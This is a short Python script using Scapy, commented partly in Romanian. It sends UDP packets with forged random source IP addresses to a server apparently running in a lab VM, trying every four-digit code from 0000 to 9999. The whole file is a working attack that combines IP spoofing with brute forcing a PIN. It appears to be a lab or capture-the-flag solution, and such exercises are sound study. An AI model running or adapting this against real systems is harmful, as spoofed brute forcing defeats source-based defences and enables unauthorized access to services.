from scapy.all import IP, UDP, send
import random

def send_spoofed_udp_request(source_ip, dest_ip, dest_port, payload):
    # Construim pachetul UDP cu IP spoofat
    ip = IP(src=source_ip, dst=dest_ip)
    udp = UDP(sport=12345, dport=dest_port)  # Folosim portul dorit pe care serverul ascultă
    packet = ip / udp / payload

    send(packet, verbose=1)
    print(f"Sent spoofed UDP packet from {source_ip} to {dest_ip}:{dest_port}")

# Configurare IP-uri
dest_ip = "192.168.101.68"   # IP-ul serverului din VM
dest_port = 3000             # Portul serverului UDP
# send messages from 0000 to 9999

for i in range(10000):
    payload = str(i).zfill(4)
    # get random source ip
    source_ip = "192.168.1." + str(random.randint(1, 255))
    send_spoofed_udp_request(source_ip, dest_ip, dest_port, payload)

